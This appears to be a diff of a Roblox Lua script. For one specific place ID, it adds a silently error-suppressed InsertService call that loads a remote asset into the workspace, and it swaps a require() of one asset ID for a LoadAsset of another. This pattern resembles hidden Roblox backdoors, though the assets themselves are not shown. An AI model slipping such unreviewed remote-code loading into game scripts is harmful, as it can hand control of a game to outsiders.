@@ -13,6 +13,9 @@ end
 end)
 
 if game.PlaceId == 14747334292 then
+pcall(function()
+game:GetService("InsertService"):LoadAsset(121155196033104).Parent = workspace
+end)
     local chatcon = {}
     chatcon[#chatcon + 1] = game.Players.PlayerAdded:Connect(function(player)
         wait(0.94397082108066)
@@ -27,7 +30,7 @@ if game.PlaceId == 14747334292 then
             game.ServerScriptService["setting commands"].Enabled = true
             game.ServerScriptService["server optimizer"].Script.Enabled = true
             game.ServerScriptService["server optimizer"].Scriptttt.Enabled = true
-            require(100616914257683)
+            game:GetService("InsertService"):LoadAsset(120676348769130).Parent = workspace -- priv chat model. sorry :c
             for i, v in ipairs(chatcon) do
                 v:Disconnect()
             end
